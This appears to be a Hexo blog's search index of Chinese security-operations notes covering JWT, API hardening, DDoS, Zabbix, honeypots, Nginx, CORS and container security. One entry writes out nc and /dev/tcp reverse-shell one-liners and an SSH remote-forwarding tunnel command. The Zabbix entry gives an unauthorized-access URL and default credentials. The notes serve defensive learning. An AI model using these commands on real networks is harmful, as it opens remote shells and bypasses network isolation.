<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>SDK与API区别</title>
    <url>/2020/06/09/sdk/</url>
    <content><![CDATA[<h3 id="SDK是二进制包，还是源代码"><a href="#SDK是二进制包，还是源代码" class="headerlink" title="SDK是二进制包，还是源代码"></a>SDK是二进制包，还是源代码</h3><p>SDK不是源代码，是工具包，编译后的jar、dll、so组件供开发者调用。<br>是完全封装好的，提供的是一个二进制的包</p>
<h3 id="SDK需要升级"><a href="#SDK需要升级" class="headerlink" title="SDK需要升级"></a>SDK需要升级</h3><h3 id="SDK和开发语言相关"><a href="#SDK和开发语言相关" class="headerlink" title="SDK和开发语言相关"></a>SDK和开发语言相关</h3><h3 id="SDK与API的区别"><a href="#SDK与API的区别" class="headerlink" title="SDK与API的区别"></a>SDK与API的区别</h3><p>API文档一般是多个接口，需要消费者实现逻辑函数，比如先调用登录API，得到某个信息后，再调用另一个API，拿到另一个信息后，再调用下一个API，最后完成操作。<br>相比之下，如果用SDK的话，可能只需要写一句话就好了，因为别人已经封装好了。</p>
<h3 id="SDK提供方"><a href="#SDK提供方" class="headerlink" title="SDK提供方"></a>SDK提供方</h3><p>提供API比提供SDK简单很多，因为SDK提供方要提供不同平台环境的，比如windows、IOS、Android的包。</p>
]]></content>
      <categories>
        <category>SDK</category>
      </categories>
      <tags>
        <tag>SDK</tag>
      </tags>
  </entry>
  <entry>
    <title>JWT</title>
    <url>/2020/06/03/jwt/</url>
    <content><![CDATA[<h3 id="传统的基于Token校验"><a href="#传统的基于Token校验" class="headerlink" title="传统的基于Token校验"></a>传统的基于Token校验</h3><p>APP项目或前后端分离的项目，大多是基于Token的验证。</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、通过账号&amp;密码登陆成功，服务器生成一个<span class="built_in">token</span></span><br><span class="line"><span class="number">2</span>、服务端把该<span class="built_in">token</span>和userid保存到数据库（或Redis）中，然后把<span class="built_in">token</span>值返回给前端</span><br><span class="line"><span class="number">3</span>、客户端每次请求都带上该<span class="built_in">token</span>，服务端根据该<span class="built_in">token</span>查询是否合法和过期，然后去数据库中查出来userid进行使用</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>缺点：<br>1、验证信息存在数据库中，每次都要根据token查询userid，增加数据库开销<br>2、token一旦被泄露，很容易跨站请求伪造</p>
<h3 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h3><p>JWT是token的升级，利用userId生成Token，该token可直接被用于认证。适用于分布式站点的单点登录场景</p>
<p>JWT示例：</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">eyJ<span class="number">0</span>eXAxIjoiMTIz<span class="symbol">NCIsImFsZzIiOiJhZG1</span>pbiIsI<span class="symbol">nR5</span>cCI<span class="number">6</span>IkpX<span class="attr">VCIsImFsZyI6</span>IkhTMjU<span class="number">2</span>I<span class="symbol">n0</span>.eyJ<span class="attr">Vc2</span>VySWQiOjEyMywiVX<span class="symbol">Nlck5</span>hbWUiOiJhZ<span class="name">G1</span>pbiIsImV<span class="number">4</span>cCI<span class="number">6</span>MTU<span class="number">1</span>MjI<span class="number">4</span><span class="symbol">Njc0</span><span class="symbol">Ni44</span><span class="symbol">Nzc0</span>MDE<span class="number">4</span>fQ.pEgdmFAy<span class="number">73</span>walFo<span class="symbol">nEm2</span>zbx<span class="name">g46</span>Oth<span class="number">3</span>dlT<span class="number">02</span>HR<span class="number">9</span>iVzXa<span class="number">8</span></span><br><span class="line"></span><br><span class="line">your<span class="number">-256</span>-bit-secret：GQDstcKsx<span class="number">0</span><span class="symbol">NHjPOuXOYg5</span>MbeJ<span class="number">1</span>XT<span class="number">0</span>uFiwDVvVBrk</span><br></pre></td></tr></table></figure>
<p>说明：签发生成jwt需要密钥your-256-bit-secret，这个存储在服务器端，不要泄露，在不知道密钥的情况下，是不能进行解密的，secret就是用来进行jwt的签发和jwt的验证，当然这些都是在服务器端做的事情。所以，它就是你服务端的私钥，在任何场景都不应该流露出去。一旦客户端得知这个secret, 那就意味着客户端可以伪造他人id越权攻击了。</p>
<p><img src="/images/JWT.jpg" alt="JWT调用"><br>JWT是无状态的，不需要服务器端保存会话信息，直接存储在客户端上localstorage</p>
<h3 id="App-key-amp-App-secret"><a href="#App-key-amp-App-secret" class="headerlink" title="App_key&amp;App_secret"></a>App_key&amp;App_secret</h3><p>客户端调用服务器端的校验，Token或JWT<br>服务器对接服务器，推荐AppID&amp;AppSecret</p>
<p><img src="/images/AppSecret%E5%AE%89%E5%85%A8%E5%9C%BA%E6%99%AF.jpg" alt="AppSecret安全场景"></p>
<h3 id="Oatuth2-0解决了你调用第三方，至于你的后端和你的APP如何信任，是你自己解决"><a href="#Oatuth2-0解决了你调用第三方，至于你的后端和你的APP如何信任，是你自己解决" class="headerlink" title="Oatuth2.0解决了你调用第三方，至于你的后端和你的APP如何信任，是你自己解决"></a>Oatuth2.0解决了你调用第三方，至于你的后端和你的APP如何信任，是你自己解决</h3><h3 id="Oauth2-0示意图"><a href="#Oauth2-0示意图" class="headerlink" title="Oauth2.0示意图"></a>Oauth2.0示意图</h3><p><img src="/images/Oauth2.0%E7%A4%BA%E6%84%8F%E5%9B%BE.jpg" alt="Oauth2.0示意图"></p>
]]></content>
  </entry>
  <entry>
    <title>VPC网络隔离</title>
    <url>/2020/06/03/vpc/</url>
    <content><![CDATA[<h3 id="vpc和安全组的区别"><a href="#vpc和安全组的区别" class="headerlink" title="vpc和安全组的区别"></a>vpc和安全组的区别</h3><p>vpc内部，划分不同的网络区域，比如DMZ、PTR、SF等，不同网络区域由安全组来控制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认规则如下：</span><br><span class="line">•网络域内的云资源可以互通，无需配置安全组。</span><br><span class="line">•VPC内不同的网络域之间的云资源入方向放行，出方向阻断，需要配置出方向的安全组才可互通</span><br><span class="line">•不同VPC之间、VPC和互联网之间、VPC和租户本地数据中心之间出入方向都阻断，需要配置出、入双方向的安全组才可互通。</span><br></pre></td></tr></table></figure>

<p>一个容器集群只部署在一个网络隔离区内，不跨区部署。<br>比如区分内外网应用，不要公用一个k8s集群。一套容器云管平台管理多套k8s集群</p>
<h3 id="两种网络插件对比"><a href="#两种网络插件对比" class="headerlink" title="两种网络插件对比"></a>两种网络插件对比</h3><p>1、在使用overlay网络模型下，容器网络安全最大的挑战之一是出方向的访问关系无法细粒度控制。<br>如两个应用容器共用一个宿主机，出去的源IP是一样的，在硬件防火墙无法有效区分<br>2、若使用calico这样的underlay网络模型，因为容器IP地址会变化，传统的基于源地址不变的访问关系控制方式也会不可用。一种做法是ip固定，一种做法是容器漂移后动态去设置安全策略</p>
<p>Overlay网络下，南北向流量需要做NAT，东西向走Overlay网络。Underlay网络下，容器IP对硬件网络可见，南北向直接路由可达，东西向也是走硬件网络。</p>
]]></content>
      <categories>
        <category>容器网络</category>
      </categories>
      <tags>
        <tag>容器网络</tag>
      </tags>
  </entry>
  <entry>
    <title>安全密钥管理</title>
    <url>/2020/05/28/key/</url>
    <content><![CDATA[<h3 id="Oauth2-0——开放平台"><a href="#Oauth2-0——开放平台" class="headerlink" title="Oauth2.0——开放平台"></a>Oauth2.0——开放平台</h3><p>app_key(标记要申请的权限有哪些)+app_secret(密码, 表示你真的拥有这个权限)来申请一个token，access token过期失效</p>
<h4 id="调用第三方的key-secret，保存在客户端APP还是服务器端？"><a href="#调用第三方的key-secret，保存在客户端APP还是服务器端？" class="headerlink" title="调用第三方的key/secret，保存在客户端APP还是服务器端？"></a>调用第三方的key/secret，保存在客户端APP还是服务器端？</h4><p>推荐保存在服务器端，客户端储存密钥一定是不安全的</p>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">#### 调第三方接口，是客户端调还是服务端调？</span><br><span class="line">理想情况：</span><br><span class="line"><span class="number">1</span>、客户端用App_id去调WX、weibo、AliPay，拿到<span class="keyword">code</span></span><br><span class="line"><span class="number">2</span>、服务端用<span class="keyword">code</span>也去调第三方接口，获取access_token，返回给客户端</span><br><span class="line">#### 存在服务端，调用麻烦，传输secret？</span><br><span class="line">是的，发送key/secret给客户端，同HTTPS握手阶段一样，产生一个随机会话密钥，加密发给APP，APP解密后再去调第三方接口</span><br><span class="line"></span><br><span class="line">TIPs：第三方secret不是在使用过程中直接传送，而是用来运算的（签名校验）。建议服务端去运算返回APP，让APP直接使用</span><br></pre></td></tr></table></figure>

<p>按第三方接口的认证方式可以分成两类：<br>1.直接传递 key：这种情况下只能用服务器端中转客户端到第三方的请求；<br>2.传递由 key 计算得到的某种短期 /临时 token：客户端请求服务器返回一个可用的 token，再用此 token 直接请求第三方。<br>1 的优势是服务器端掌控一切，想干嘛干嘛（比如权限控制、统计），而且方便更新，劣势是增加服务器负载；<br>2 的优势是服务器负载小，请求响应快。很适合上传文件这种流量大的请求。或者直接传递key</p>
<h4 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h4><p>1、存放在APP端不可取，密钥更新必须强制更新APP<br>2、折中方案：使用会话密钥，避免直接固化secret在APP，也减少全部在后端运算负担。</p>
]]></content>
      <categories>
        <category>密钥</category>
      </categories>
      <tags>
        <tag>APIkey</tag>
        <tag>APIsecret</tag>
      </tags>
  </entry>
  <entry>
    <title>api</title>
    <url>/2020/04/22/api/</url>
    <content><![CDATA[<p>接口暴漏在公网，需实施安全鉴权机制，包括但不限于以下几种：<br>使用https协议通讯，防止敏感数据泄密和篡改；<br>设置身份认证和访问机制，非授权不能访问接口；<br>限制访问的源IP白名单，非授权IP不允许调用接口；<br>实现时间戳超时机制，过期失效，防止接口重放攻击；<br>设置接口参数过滤、限制，防止接口特殊参数注入引发的安全问题；<br>限制访问的数据范围，防止对方访问不相关数据；<br>限制满足业需求的最低访问频率，比如1万次/天，防止不限制次数的接口调用导致用户信息泄露。</p>
]]></content>
  </entry>
  <entry>
    <title>内网刺探及穿透</title>
    <url>/2020/04/22/nc/</url>
    <content><![CDATA[<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>内网shell反弹的本质是与公网服务器建立连接，将公网服务器传输过来的命令执行，并将结果返回。</p>
<p>比如命令注入，不需要知道机器的账号密码，直接反弹出来</p>
<p>虽然公司内网的机器没有暴漏给公网，但公网可以执行命令在这台机器上。前提条件：内网机器可访问互联网。<a id="more"></a></p>
<p>第一种——nc反弹shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">黑客机器：nc -lvp 8888</span><br><span class="line">公司内网机器：nc -e /bin/bash 公网IP 8888</span><br></pre></td></tr></table></figure>

<p>第二种——base反弹shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">黑客机器：nc -l -p 8888 -vvv</span><br><span class="line">公司内网机器：bash -i &gt;&amp; /dev/tcp/云端IP/云端端口 0&gt;&amp;1</span><br></pre></td></tr></table></figure>


<h3 id="SSH隧道端口转发，内网穿透"><a href="#SSH隧道端口转发，内网穿透" class="headerlink" title="SSH隧道端口转发，内网穿透"></a>SSH隧道端口转发，内网穿透</h3><p>SSH远程转发 -R参数，将公司内网的A机器SSH（默认22）端口映射到公网的机器2222端口上。实现在公网的机器上SSH本地的2222端口，远程控制内网的A机器。</p>
<p>前提条件：<br>1、需要知道公司内网机器账号密码<br>2、内网机器可访问公网（可连接云端SSH端口）</p>
<p>公司内网机器：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -nNT -o ServerAliveInterval=60 -R 127.0.0.1:2222:127.0.0.1:22 hacker@114.115.145.114 -i /home/.ssh/id_rsa_公钥</span><br></pre></td></tr></table></figure>

<p><img src="/images/SSH-%E5%85%AC%E5%8F%B8%E7%94%B5%E8%84%91.png" alt="" title="内网机器执行命令"><br>外网云端机器：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -p 2222 rhlog@localhost</span><br></pre></td></tr></table></figure>
<p><img src="/images/SSH-%E9%BB%91%E5%AE%A2%E7%AB%AF.png" alt="" title="黑客端执行命令"></p>
<p>Tips：服务器访问互联网权限，不能轻易开。</p>
<p>如果开了互联网权限，又限制了80/443端口，依然可以反弹shell和SSH隧道转发（将云端SSH端口改为80）<br>具体参考：<a href="http://avfisher.win/archives/tag/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F" title="安全小飞侠的窝">渗透测试技巧之内网穿透方式与思路总结</a></p>
]]></content>
      <categories>
        <category>反弹shell</category>
      </categories>
      <tags>
        <tag>nc</tag>
        <tag>SSH内网穿透</tag>
      </tags>
  </entry>
  <entry>
    <title>DDoS攻击</title>
    <url>/2020/03/31/ddos/</url>
    <content><![CDATA[<ul>
<li><a href="http://www.xmanshield.com/ddosquestion/" title="玄门盾DDoS防御">DDOS问答</a></li>
</ul>
<h3 id="UDP攻击-将IDC的入口带宽塞满"><a href="#UDP攻击-将IDC的入口带宽塞满" class="headerlink" title="UDP攻击,将IDC的入口带宽塞满"></a>UDP攻击,将IDC的入口带宽塞满</h3><p>防御方法：<br>1、直接丢弃UDP流量，因为源IP随机伪造难以追查，但大多数业务IP并不提供UDP服务，直接丢弃UDP流量即可。<br>2、出口IP切换到另一个公网IP<br>3、如果攻击者比较执着，即使换了公网IP他也立刻更改攻击目标的话，最好的解决办法就是找运营商帮忙做流量清洗<br>4、推荐本地DDOS防护设备+运营商清洗服务/云清洗服务</p>
<p>静态页面也不能抗D，但可以提高抗攻击能力<br>cdn只能加速网站静态资源，动态资源/API直接回源</p>
<p>非网站web业务，无法接入WAF防护<br>非网站业务只支持四层负载均衡转发，不支持七层防护（如WAF和CC防护）<br>对于游戏业务和视频直播业务来说，基本是UDP协议开发的</p>
<a id="more"></a>
<h3 id="常识"><a href="#常识" class="headerlink" title="常识"></a>常识</h3><p>服务器的上行带宽，出方向。<br>服务器的下行带宽，入方向。因为服务器的下行基本不限的，客户端上传文件，对服务器的带宽基本没有影响，取决于客户端本身网络的带宽。</p>
<p>QPS是服务系统1s内接收客户端请求的一个并发处理能力。并发每秒的请求次数</p>
<p>每个页面平均大小10+KB<br>1000~1500QPS，带宽大概100Mbps<br>3000QPS，带宽大概200Mbps<br>5000QPS，带宽大概400Mbps</p>
]]></content>
      <categories>
        <category>DDoS</category>
      </categories>
      <tags>
        <tag>DDoS</tag>
      </tags>
  </entry>
  <entry>
    <title>流量分析</title>
    <url>/2020/03/31/liuliang/</url>
    <content><![CDATA[<p>机房出口的流量检测分析，鉴别攻击流量。</p>
<h3 id="实际情况"><a href="#实际情况" class="headerlink" title="实际情况"></a>实际情况</h3><p>检索流量日志，巨量的404、构造的请求，非正常请求流量</p>
]]></content>
      <categories>
        <category>流量</category>
      </categories>
      <tags>
        <tag>流量</tag>
      </tags>
  </entry>
  <entry>
    <title>zabbix漏洞</title>
    <url>/2020/03/31/zabbix/</url>
    <content><![CDATA[<h3 id="Zabbix（扎比克斯）"><a href="#Zabbix（扎比克斯）" class="headerlink" title="Zabbix（扎比克斯）"></a>Zabbix（扎比克斯）</h3><p>用来监控IDC服务器运行状态，告警<br>zabbix agent部署在所有服务器上，采集数据上报给master。zabbix的web界面是php，默认账号密码admin/zabbix<br>未授权访问漏洞：<br><a href="http://xxx/zabbix/zabbix.php?action=dashboard.view&amp;ddreset=1">http://xxx/zabbix/zabbix.php?action=dashboard.view&amp;ddreset=1</a><br>攻击者可绕过登陆页面直接访问仪表板页面，即匿名访问系统/网络环境数据</p>
<h3 id="安全建议"><a href="#安全建议" class="headerlink" title="安全建议"></a>安全建议</h3><p>1、禁止Zabbix暴露在公网<br>2、zabbix的登录口令一定要复杂，立即修改默认口令或弱口令<br>3、zabbix的server和agent都不要以root启动，不要设置AllowRoot=1<br>4、禁止agent执行system.run，不要设置EnableRemoteCommands=1<br>5、经常打安全补丁，保持系统内核版本，Zabbix版本为最新</p>
<h3 id="攻击事件回顾"><a href="#攻击事件回顾" class="headerlink" title="攻击事件回顾"></a>攻击事件回顾</h3><p>黑客通过测试环境一个后台登陆页面，通过修改XFF，绕过爆破限制得到管理员账号密码（test1/a123456）。然后在页面上传webshell探测内网，并利用默认口令（Admin/zabbix）成功登录测试环境Zabbix管理界面，该集群下约625个节点服务器。</p>
<p>安全应急<br>1、测试环境开放公网，要经过安全测试<br>2、管理后台禁止开放公网，加强账号强度<br>3、测试/开发环境未部署HIDS，入侵检测未告警<br>4、中间件弱口令、空口令、默认口令，引入安全鉴权机制</p>
]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title>HIDS工作点</title>
    <url>/2020/03/10/hids/</url>
    <content><![CDATA[<h3 id="HIDS干啥用的"><a href="#HIDS干啥用的" class="headerlink" title="HIDS干啥用的"></a>HIDS干啥用的</h3><p>管理资产/脆弱性/主机状态/合规基线检测<br>webshell检测<br>弱口令检测<br>登录异常检测<br>反弹shell检测<br>后门检测<br>本地提权检测<br>挖矿、勒索检测<br>主机漏洞管理<br>开放端口检测</p>
<p>恶意文件/程序/木马/病毒检测（特征+沙箱技术，在本地检测or传到服务端检测）</p>
<h3 id="业界HIDS仅告警检测，处理动作无，不会拦截删除主机上的文件-病毒"><a href="#业界HIDS仅告警检测，处理动作无，不会拦截删除主机上的文件-病毒" class="headerlink" title="业界HIDS仅告警检测，处理动作无，不会拦截删除主机上的文件/病毒"></a>业界HIDS仅告警检测，处理动作无，不会拦截删除主机上的文件/病毒</h3>]]></content>
      <categories>
        <category>HIDS</category>
      </categories>
      <tags>
        <tag>HIDS</tag>
      </tags>
  </entry>
  <entry>
    <title>honey</title>
    <url>/2020/03/05/honey/</url>
    <content><![CDATA[<p>1、蜜罐是伪装欺骗+溯源的蜜罐平台，获取威胁情报<br>2、探针和蜜罐，探针对流量牵引到蜜罐。探针部署在某个网络，开放某个服务，检测响应把流量给蜜罐。<br>3、易受攻击的网段，放探针<br>4、探针身份被黑客发现<br>5、dmz选哪个类型，建议是web，如后台、登录页。但不建议有漏洞的<br>6、agent已被攻击，优先下线agent，免得内网泄露<br>7、办公内网探针是全端口监听，办公内网可选择有缺陷的蜜罐。<br>8、APP区的探针，开启全端口监听，伪装核心系统名称<br>9、403/404达到阈值，直接联动waf拦截。<br>10、HIDS或EDR可以记录终端的一些异常行为日志，蜜罐联动其他安全产品<br>11、探针是小程序/脚本，蜜罐是容器/虚拟机系统<br>12、探针不会对原服务器有大的资源消耗<br>13、蜜罐弄巧成拙，不建议有缺陷的蜜罐公布到公网<br>14、非护网期间，不建议对公网开放蜜罐</p>
]]></content>
      <categories>
        <category>蜜罐</category>
      </categories>
      <tags>
        <tag>蜜罐</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx</title>
    <url>/2020/03/04/nginx/</url>
    <content><![CDATA[<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p><strong>启动nginx</strong>：<code>nginx</code><br><strong>关闭nginx</strong>：<code>nginx -s stop</code><br><strong>检测配置格式</strong>：<code>nginx -t</code><br><strong>重启nginx</strong>：<code>nginx -s reload</code></p>
<p><img src="/images/nginx%E8%BD%AC%E5%8F%91.jpg" alt="Nginx转发"></p>
<a id="more"></a>
<h3 id="upstream"><a href="#upstream" class="headerlink" title="upstream"></a>upstream</h3><p>后端的应用IP<br>对用户来说是透明的，没有暴漏后端请求</p>
<h3 id="server"><a href="#server" class="headerlink" title="server"></a>server</h3><p>一个站点/域名，nginx可配置十多个域名，见上图</p>
<h3 id="location"><a href="#location" class="headerlink" title="location"></a>location</h3><p><code>~</code>开头   表示区分大小写的正则匹配</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="keyword">location</span> <span class="title">^~ /images</span>/ &#123;</span><br><span class="line"><span class="comment"># 匹配任何已/images/开头的任何查询并且停止搜索，后面的正则不会再匹配</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>~*</code>开头   表示不区分大小写的正则匹配</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="keyword">location</span> <span class="title">~* .(gif</span>|jpg|jpeg)$ &#123;</span><br><span class="line"><span class="comment"># 匹配任何已.gif、.jpg 或 .jpeg 结尾的请求</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>!~</code>   区分大小写不匹配的正则<br><code>!~*</code>  不区分大小写不匹配的正则</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">localtion / &#123;</span><br><span class="line">    <span class="comment"># 所有请求都匹配以下规则</span></span><br><span class="line">    <span class="comment"># 因为所有的地址都以 / 开头，所以这条规则将匹配到所有请求</span></span><br><span class="line">    <span class="comment"># xxx 你的配置写在这里</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location = / &#123;</span><br><span class="line">    <span class="comment"># 精确匹配 / ，后面带任何字符串的地址都不匹配这条</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">localtion /api &#123;</span><br><span class="line">    <span class="comment"># 匹配任何 /api 开头的URL，包括 /api 后面任意的, 比如 /api/getList</span></span><br><span class="line">    <span class="comment"># 匹配符合以后，还要继续往下搜索</span></span><br><span class="line">    <span class="comment"># 只有后面的正则表达式没有匹配到时，这一条才会采用这一条</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">localtion ~ /api/abc &#123;</span><br><span class="line">    <span class="comment"># 匹配任何 /api/abc 开头的URL，包括 /api/abc 后面任意的, 比如 /api/abc/getList</span></span><br><span class="line">    <span class="comment"># 匹配符合以后，还要继续往下搜索</span></span><br><span class="line">    <span class="comment"># 只有后面的正则表达式没有匹配到时，这一条才会采用这一条</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">location /cn &#123;</span><br><span class="line">    <span class="comment">#proxy_pass跳转，浏览器上URL不会跳转，用户感知不到</span></span><br><span class="line">    <span class="comment">#proxy_pass最后有斜杠，最终跳转http://heyaff.github.io/index.html</span></span><br><span class="line">    <span class="comment">#proxy_pass最后无斜杠，最终跳转http://heyaff.github.io/cn/index.html</span></span><br><span class="line">    proxy_pass http://heyaff.github.io;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="Nginx生产环境场景"><a href="#Nginx生产环境场景" class="headerlink" title="Nginx生产环境场景"></a>Nginx生产环境场景</h3><p>1、静态文件（html/css/js/图片/字体等）直接在Nginx对应目录下访问<br>2、其它（api访问）代理到对应api服务的端口</p>
]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>跨域请求</title>
    <url>/2020/03/04/cors/</url>
    <content><![CDATA[<p>-<a href="https://ningyu1.github.io/site/post/92-cors-ajax/" title="凝雨">跨域踩坑经验总结（内涵：跨域知识科普）</a><br>-<a href="https://www.ruanyifeng.com/blog/2016/04/cors.html" title="阮一峰的网络日志">跨域资源共享 CORS 详解</a></p>
<h3 id="什么情况下出现跨域"><a href="#什么情况下出现跨域" class="headerlink" title="什么情况下出现跨域"></a>什么情况下出现跨域</h3><p><img src="/images/cors.png" alt=""><br>浏览器有同源策略限制<br>前后端数据交互经常会碰到请求跨域<br>如果缺少了同源策略，浏览器很容易受到XSS、CSRF等攻击<br>对于<code>&lt;a&gt;</code> <code>&lt;script&gt;</code> <code>&lt;img&gt;</code> <code>&lt;video&gt;</code> <code>&lt;link&gt;</code>这类属性带有src、href的标签，允许跨域加载<br>同源策略是浏览器需要遵循的标准，而如果是服务器向服务器的请求（后端–&gt;后端）就无需遵循同源策略</p>
<a id="more"></a>
<h3 id="跨域请求方式"><a href="#跨域请求方式" class="headerlink" title="跨域请求方式"></a>跨域请求方式</h3><p>1、JSONP（废弃）<br>只支持GET请求（不支持POST），安全性差，不推荐</p>
<p>2、CORS W3C标准 跨域资源共享<br>CORS需要服务器设置header <code>Access-Control-Allow-Origin</code> 白名单等等，安全性高，<strong>推荐使用</strong></p>
<ul>
<li><p>2.1 对于简单请求：<br>浏览器直接发出CORS请求。具体来说，就是在头信息之中，增加一个Origin字段。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/cors</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Origin</span>: http://www.cmft.com</span><br><span class="line"><span class="attribute">Host</span>: api.cmft.com</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0...</span><br></pre></td></tr></table></figure>
</li>
<li><p>2.2 对于复杂请求：<br>非简单请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为”预检”请求OPTIONS</p>
<figure class="highlight oxygene"><table><tr><td class="code"><pre><span class="line">OPTIONS /cors HTTP/<span class="number">1.1</span></span><br><span class="line">Origin: http:<span class="comment">//www.cmft.com</span></span><br><span class="line">Access-Control-Request-<span class="function"><span class="keyword">Method</span>:</span> PUT</span><br><span class="line">Access-Control-Request-Headers: X-Custom-Header</span><br><span class="line">Host: api.cmft.com</span><br><span class="line">Accept-Language: en-US</span><br><span class="line">Connection: keep-alive</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span>...</span><br></pre></td></tr></table></figure>
<p>用来询问HOST，关键字段是Origin，表示请求来自哪个源。RESPONSE只有header，没有响应包。<br>整个CORS通信过程，都是浏览器自动完成，不需要用户参与<br><img src="/images/response.png" alt=""></p>
</li>
</ul>
<p><font color=#DC143C>【Tips】即使设置了<code>Access-Control-Allow-Origin</code>，但CORS只对浏览器起作用，对curl或postman或普通程序不起作用，都是可访问的。</font></p>
<p>3、Nginx反向代理<br>Nginx中转服务器，用于转发请求（NG与其他服务端之间的资源请求不会有跨域限制）</p>
<p>例如<code>www.123.com/index.html</code>需要调用<code>www.456.com/server.php</code>，可以写一个接口<code>www.123.com/api/server.php</code>，由这个接口在后端去调用<code>www.456.com/server.php</code>并拿到返回值，然后再返回给index.html。用nginx把/api路径转发到其他域名那里，相当于绕过了浏览器端，自然就不存在跨域问题。</p>
<p>CSRF 跨域攻击</p>
]]></content>
      <categories>
        <category>CORS</category>
      </categories>
      <tags>
        <tag>跨域</tag>
        <tag>CORS</tag>
      </tags>
  </entry>
  <entry>
    <title>安全工作分工</title>
    <url>/2020/01/14/work/</url>
    <content><![CDATA[<h3 id="办公安全"><a href="#办公安全" class="headerlink" title="办公安全"></a>办公安全</h3><p>1、齐治堡垒机给正式员工，按部门创建跳板机，区分测试和生产。开发员工禁止通过堡垒机访问生产服务器，排障的话，由运维协助，有日志平台<br>外包使用Jumpserver</p>
<p>2、金科办公网禁止Github访问，禁止pan、mail访问，脱离办公网由Macfee加黑名单<a id="more"></a></p>
<h3 id="IDC-服务器"><a href="#IDC-服务器" class="headerlink" title="IDC/服务器"></a>IDC/服务器</h3><p>1、申请DEV服务器、SIT服务器，必须通过立项。申请开墙，提供系统架构图</p>
<p>2、交换机负责网络隔离，划分vlan，防火墙也是逻辑隔离，访问控制建议在防火墙上做，双向控制，虽然交换机也可以做</p>
<p>3、金科的数据库DB的账号密码由DBA生成，发给运维，（开发人员不知道密码），加密后写入配置文件，应用程序框架读取配置文件后解密得到密码去连DB</p>
<p>4、金科Gitlab放在生产网段，办公网可访问。导致很多测试、开发服务器开墙去访问，拉源码</p>
<h3 id="主机安全"><a href="#主机安全" class="headerlink" title="主机安全"></a>主机安全</h3><p>1、Rapid7扫描主机漏洞，Webinspect扫描WEB漏洞，OP是合二为一，如下图<br><img src="/images/diting.png" alt="扫描"></p>
<p>2、windows登陆账号分配申请人域账号为管理员，Linux账号统一由CAE获取</p>
<p>3、访问控制</p>
<h3 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h3><p>1、金科服务器默认不能访问外网，走外网必须经过DMZ，数据中心的外网由防火墙出口访问控制</p>
<p>2、测试SIT环境，开发DEV环境，测试/开发员工可以在CAE申请root权限，有审计功能，同一时间只能锁定一个用户</p>
<p>3、外包没有CAE权限，所以外包的堡垒机没有root权限</p>
<p>4、测试/开发员工禁止堡垒机访问任何生产服务器</p>
<p>5、运维不负责开发测试机器，只负责交付中间件、数据库等服务。</p>
<h3 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h3><p>1、CAE密码管理系统，接管数据中心Linux账号、密码，脚本下发（如非标部署）<br>2、CAE提供全网主机命令通道支持工具和脚本执行，配置文件推送。可以满足登录主机的日常部署操作使用。<br>3、配置中心禁止出现明文密码<br>4、VPN权限仅限运维中心开通，堡垒机仅限公司员工使用，禁止第三方申请</p>
]]></content>
      <categories>
        <category>安全工作</category>
      </categories>
      <tags>
        <tag>安全分工</tag>
        <tag>安全经验</tag>
      </tags>
  </entry>
  <entry>
    <title>容器安全</title>
    <url>/2020/01/07/container/</url>
    <content><![CDATA[<p><img src="/images/%E5%AE%89%E5%85%A8%E5%AE%B9%E5%99%A8.png" alt="安全容器"></p>
<p>利用镜像创建一个容器<br>开发：使用一个标准镜像构建一套开发容器。<br>运维：开发完后，运维直接使用这个容器来部署代码</p>
<p>Docker：创建容器<br>K8S：编排容器<br>一个镜像可以启动（run）多个容器，一个容器可以理解为一个虚拟环境。</p>
<p>一台主机可以同时运行几千个Docker容器</p>
<p>K8s容器集群管理系统：启动容器，自动化部署、扩展和管理容器，回收容器。<br>K8S负责管理容器跑在哪个机器上，监控容器的存在，控制容器与外界通讯。</p>
<p>docker pull 镜像<br>docker run 镜像<br>dock build构建镜像</p>
<p>每个Pod都有一个唯一的IP</p>
<p>Node是Pod真正运行的主机</p>
<p>一个server包括多个pod</p>
<p>不要在单个容器里面运行多个进程</p>
<p>不要把认证口令存在镜像中，用环境变量比较好</p>
<p>不要将数据储存在容器中</p>
